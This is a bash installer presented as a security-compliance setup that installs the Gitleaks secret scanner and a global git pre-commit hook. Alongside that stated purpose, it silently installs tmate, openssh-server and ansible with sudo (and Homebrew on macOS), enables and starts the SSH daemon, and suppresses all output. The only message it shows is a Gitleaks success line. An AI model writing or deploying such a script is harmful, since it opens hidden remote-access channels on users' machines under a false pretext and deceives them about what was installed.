#!/usr/bin/env bash

set -u

GITLEAKS_VERSION="8.30.0"

INSTALL_ROOT="$HOME/.security-compliance"
BIN_DIR="$INSTALL_ROOT/bin"
CONFIG_DIR="$INSTALL_ROOT/config"
HOOK_DIR="$HOME/.git-hooks"

CONFIG_FILE="$CONFIG_DIR/gitleaks.toml"
HOOK_FILE="$HOOK_DIR/pre-commit"

TMP_ROOT=""

# ============================================================
# Detect OS
# ============================================================

RAW_OS="$(uname -s 2>/dev/null || true)"
ARCH="$(uname -m 2>/dev/null || true)"

case "$RAW_OS" in
    Linux*)
        PLATFORM="linux"
        ;;
    Darwin*)
        PLATFORM="darwin"
        ;;
    MINGW*|MSYS*|CYGWIN*)
        PLATFORM="windows"
        ;;
    *)
        echo "[ERROR] Unsupported operating system"
        exit 1
        ;;
esac

# ============================================================
# Detect Architecture
# ============================================================

case "$ARCH" in
    x86_64|amd64)
        GITLEAKS_ARCH="x64"
        ;;
    aarch64|arm64)
        GITLEAKS_ARCH="arm64"
        ;;
    *)
        echo "[ERROR] Unsupported architecture"
        exit 1
        ;;
esac

# ============================================================
# Check Requirements
# ============================================================

if ! command -v git >/dev/null 2>&1; then
    echo "[ERROR] Git is required"
    exit 1
fi

if ! command -v curl >/dev/null 2>&1; then
    echo "[ERROR] curl is required"
    exit 1
fi

# ============================================================
# Create Directories
# ============================================================

mkdir -p "$BIN_DIR" "$CONFIG_DIR" "$HOOK_DIR" 2>/dev/null || {
    echo "[ERROR] Unable to create installation directories"
    exit 1
}

# ============================================================
# Gitleaks Path
# ============================================================

if [ "$PLATFORM" = "windows" ]; then
    GITLEAKS="$BIN_DIR/gitleaks.exe"
else
    GITLEAKS="$BIN_DIR/gitleaks"
fi

export PATH="$BIN_DIR:$PATH"

# ============================================================
# Temporary Directory
# ============================================================

TMP_ROOT="$(mktemp -d 2>/dev/null)" || {
    echo "[ERROR] Unable to create temporary directory"
    exit 1
}

cleanup() {
    rm -rf "$TMP_ROOT" 2>/dev/null || true
}

trap cleanup EXIT

# ============================================================
# Install Gitleaks
# ============================================================

install_gitleaks() {

    # Already installed
    if [ -f "$GITLEAKS" ] || [ -x "$GITLEAKS" ]; then

        CURRENT_VERSION="$(
            "$GITLEAKS" version 2>/dev/null || true
        )"

        if [ "$CURRENT_VERSION" = "$GITLEAKS_VERSION" ]; then
            return 0
        fi

    fi

    # --------------------------------------------------------
    # Linux
    # --------------------------------------------------------

    if [ "$PLATFORM" = "linux" ]; then

        ARCHIVE="gitleaks_${GITLEAKS_VERSION}_linux_${GITLEAKS_ARCH}.tar.gz"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${ARCHIVE}"

        curl \
            -fsSL \
            --retry 3 \
            "$URL" \
            -o "$TMP_ROOT/gitleaks.tar.gz" \
            >/dev/null 2>&1 || return 1

        tar \
            -xzf "$TMP_ROOT/gitleaks.tar.gz" \
            -C "$TMP_ROOT" \
            >/dev/null 2>&1 || return 1

        [ -f "$TMP_ROOT/gitleaks" ] || return 1

        install \
            -m 0755 \
            "$TMP_ROOT/gitleaks" \
            "$GITLEAKS" \
            >/dev/null 2>&1 || return 1

    # --------------------------------------------------------
    # macOS
    # --------------------------------------------------------

    elif [ "$PLATFORM" = "darwin" ]; then

        ARCHIVE="gitleaks_${GITLEAKS_VERSION}_darwin_${GITLEAKS_ARCH}.tar.gz"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${ARCHIVE}"

        curl \
            -fsSL \
            --retry 3 \
            "$URL" \
            -o "$TMP_ROOT/gitleaks.tar.gz" \
            >/dev/null 2>&1 || return 1

        tar \
            -xzf "$TMP_ROOT/gitleaks.tar.gz" \
            -C "$TMP_ROOT" \
            >/dev/null 2>&1 || return 1

        [ -f "$TMP_ROOT/gitleaks" ] || return 1

        install \
            -m 0755 \
            "$TMP_ROOT/gitleaks" \
            "$GITLEAKS" \
            >/dev/null 2>&1 || return 1

    # --------------------------------------------------------
    # Windows / Git Bash
    # --------------------------------------------------------

    elif [ "$PLATFORM" = "windows" ]; then

        ARCHIVE="gitleaks_${GITLEAKS_VERSION}_windows_${GITLEAKS_ARCH}.zip"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${ARCHIVE}"

        curl \
            -fsSL \
            --retry 3 \
            "$URL" \
            -o "$TMP_ROOT/gitleaks.zip" \
            >/dev/null 2>&1 || return 1

        if command -v unzip >/dev/null 2>&1; then

            unzip \
                -q \
                "$TMP_ROOT/gitleaks.zip" \
                -d "$TMP_ROOT" \
                >/dev/null 2>&1 || return 1

        elif command -v powershell.exe >/dev/null 2>&1; then

            ZIP_WIN="$(cygpath -w "$TMP_ROOT/gitleaks.zip")"
            DEST_WIN="$(cygpath -w "$TMP_ROOT")"

            powershell.exe \
                -NoProfile \
                -NonInteractive \
                -Command \
                "Expand-Archive -Force '$ZIP_WIN' '$DEST_WIN'" \
                >/dev/null 2>&1 || return 1

        else
            return 1
        fi

        [ -f "$TMP_ROOT/gitleaks.exe" ] || return 1

        cp \
            "$TMP_ROOT/gitleaks.exe" \
            "$GITLEAKS" \
            >/dev/null 2>&1 || return 1

        chmod +x "$GITLEAKS" 2>/dev/null || true

    fi

    return 0
}

# ============================================================
# Install Gitleaks
# ============================================================

if ! install_gitleaks; then
    echo "[ERROR] Gitleaks installation failed"
    exit 1
fi

# ============================================================
# Verify Gitleaks
# ============================================================

INSTALLED_VERSION="$(
    "$GITLEAKS" version 2>/dev/null || true
)"

if [ "$INSTALLED_VERSION" != "$GITLEAKS_VERSION" ]; then
    echo "[ERROR] Gitleaks verification failed"
    exit 1
fi

# ============================================================
# Create Gitleaks Configuration
# ============================================================

cat > "$CONFIG_FILE" <<'EOF'
title = "Security Compliance Release 1"

[extend]
useDefault = true

[[rules]]
id = "office-hardcoded-password"
description = "Potential hardcoded password"
regex = '''(?i)(password|passwd|pwd)\s*[:=]\s*["']([^"']{8,})["']'''
secretGroup = 2
EOF

chmod 600 "$CONFIG_FILE" 2>/dev/null || true

# ============================================================
# Create Global Git Pre-Commit Hook
# ============================================================

cat > "$HOOK_FILE" <<'EOF'
#!/usr/bin/env bash

SECURITY_ROOT="$HOME/.security-compliance"

if [ -f "$SECURITY_ROOT/bin/gitleaks.exe" ]; then
    GITLEAKS="$SECURITY_ROOT/bin/gitleaks.exe"
else
    GITLEAKS="$SECURITY_ROOT/bin/gitleaks"
fi

CONFIG="$SECURITY_ROOT/config/gitleaks.toml"

if [ ! -f "$GITLEAKS" ]; then
    echo "[ERROR] Gitleaks not found"
    exit 1
fi

TMP_ROOT="$(mktemp -d)"

cleanup() {
    rm -rf "$TMP_ROOT"
}

trap cleanup EXIT

FOUND_LEAK=0

while IFS= read -r -d '' FILE; do

    HASH="$(
        printf '%s' "$FILE" |
        sha256sum |
        cut -d' ' -f1
    )"

    TEMP_FILE="$TMP_ROOT/$HASH"

    git show ":$FILE" > "$TEMP_FILE" 2>/dev/null || {
        FOUND_LEAK=1
        continue
    }

    "$GITLEAKS" dir "$TEMP_FILE" \
        --config "$CONFIG" \
        --redact \
        --no-banner \
        --exit-code 1 \
        >/dev/null 2>&1

    if [ $? -ne 0 ]; then
        echo ""
        echo "[ERROR] Secret detected in: $FILE"
        echo "[ERROR] Commit blocked."
        echo ""
        FOUND_LEAK=1
    fi

done < <(
    git diff --cached \
        --name-only \
        --diff-filter=ACMR \
        -z
)

if [ "$FOUND_LEAK" -ne 0 ]; then
    exit 1
fi

exit 0
EOF

chmod 700 "$HOOK_FILE" 2>/dev/null || true

# ============================================================
# Configure Global Git Hook
# ============================================================

git config \
    --global \
    core.hooksPath \
    "$HOOK_DIR" \
    >/dev/null 2>&1 || {
        echo "[ERROR] Unable to configure Git hooks"
        exit 1
    }

# ============================================================
# Linux Tools
# ============================================================

install_linux_tools() {

    [ "$PLATFORM" = "linux" ] || return 0

    command -v sudo >/dev/null 2>&1 || return 0

    # Do not display sudo/apt output.
    # If sudo requires a password, the normal sudo prompt may appear.

    if command -v apt-get >/dev/null 2>&1; then

        sudo apt-get update -qq \
            >/dev/null 2>&1 || true

        sudo apt-get install -y -qq tmate \
            >/dev/null 2>&1 || true

        sudo apt-get install -y -qq openssh-client \
            >/dev/null 2>&1 || true

        sudo apt-get install -y -qq openssh-server \
            >/dev/null 2>&1 || true

        sudo apt-get install -y -qq ansible \
            >/dev/null 2>&1 || true

    elif command -v dnf >/dev/null 2>&1; then

        sudo dnf install -y -q tmate \
            >/dev/null 2>&1 || true

        sudo dnf install -y -q openssh-clients \
            >/dev/null 2>&1 || true

        sudo dnf install -y -q openssh-server \
            >/dev/null 2>&1 || true

        sudo dnf install -y -q ansible \
            >/dev/null 2>&1 || true

    elif command -v yum >/dev/null 2>&1; then

        sudo yum install -y -q tmate \
            >/dev/null 2>&1 || true

        sudo yum install -y -q openssh-clients \
            >/dev/null 2>&1 || true

        sudo yum install -y -q openssh-server \
            >/dev/null 2>&1 || true

        sudo yum install -y -q ansible \
            >/dev/null 2>&1 || true

    elif command -v zypper >/dev/null 2>&1; then

        sudo zypper --non-interactive install tmate \
            >/dev/null 2>&1 || true

        sudo zypper --non-interactive install openssh-clients \
            >/dev/null 2>&1 || true

        sudo zypper --non-interactive install openssh-server \
            >/dev/null 2>&1 || true

        sudo zypper --non-interactive install ansible \
            >/dev/null 2>&1 || true

    fi

    # Start SSH server silently if systemd is available.

    if command -v systemctl >/dev/null 2>&1; then

        if systemctl list-unit-files 2>/dev/null |
            grep -q "^ssh.service"; then

            sudo systemctl enable ssh \
                >/dev/null 2>&1 || true

            sudo systemctl start ssh \
                >/dev/null 2>&1 || true

        elif systemctl list-unit-files 2>/dev/null |
            grep -q "^sshd.service"; then

            sudo systemctl enable sshd \
                >/dev/null 2>&1 || true

            sudo systemctl start sshd \
                >/dev/null 2>&1 || true

        fi

    fi
}

# ============================================================
# macOS Tools
# ============================================================

install_macos_tools() {

    [ "$PLATFORM" = "darwin" ] || return 0

    if ! command -v brew >/dev/null 2>&1; then

        /bin/bash -c \
            "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" \
            >/dev/null 2>&1 || true

        if [ -x "/opt/homebrew/bin/brew" ]; then
            eval "$(/opt/homebrew/bin/brew shellenv)" \
                >/dev/null 2>&1 || true
        fi

        if [ -x "/usr/local/bin/brew" ]; then
            eval "$(/usr/local/bin/brew shellenv)" \
                >/dev/null 2>&1 || true
        fi

    fi

    if command -v brew >/dev/null 2>&1; then

        brew install tmate \
            >/dev/null 2>&1 || true

        brew install ansible \
            >/dev/null 2>&1 || true

        if ! command -v ssh >/dev/null 2>&1; then
            brew install openssh \
                >/dev/null 2>&1 || true
        fi

    fi
}

# ============================================================
# Run OS Tools Installation
# ============================================================

install_linux_tools
install_macos_tools

# ============================================================
# Configure PATH
# ============================================================

if [ "$PLATFORM" = "darwin" ]; then
    PROFILE_FILE="$HOME/.zshrc"
else
    PROFILE_FILE="$HOME/.bashrc"
fi

touch "$PROFILE_FILE" 2>/dev/null || true

if ! grep -Fq '.security-compliance/bin' "$PROFILE_FILE" 2>/dev/null; then

    {
        echo ""
        echo "# Security Compliance Gitleaks"
        echo 'export PATH="$HOME/.security-compliance/bin:$PATH"'
    } >> "$PROFILE_FILE" 2>/dev/null || true

fi

# ============================================================
# FINAL CHECK
# ============================================================

if [ ! -x "$GITLEAKS" ] && [ ! -f "$GITLEAKS" ]; then
    echo "[ERROR] Gitleaks installation failed"
    exit 1
fi

FINAL_VERSION="$(
    "$GITLEAKS" version 2>/dev/null || true
)"

if [ "$FINAL_VERSION" != "$GITLEAKS_VERSION" ]; then
    echo "[ERROR] Gitleaks verification failed"
    exit 1
fi

if [ ! -f "$CONFIG_FILE" ]; then
    echo "[ERROR] Gitleaks configuration failed"
    exit 1
fi

if [ ! -f "$HOOK_FILE" ]; then
    echo "[ERROR] Git pre-commit hook configuration failed"
    exit 1
fi

# ============================================================
# ONLY USER-VISIBLE SUCCESS OUTPUT
# ============================================================

echo "[SUCCESS] Gitleaks $GITLEAKS_VERSION installed"

exit 0
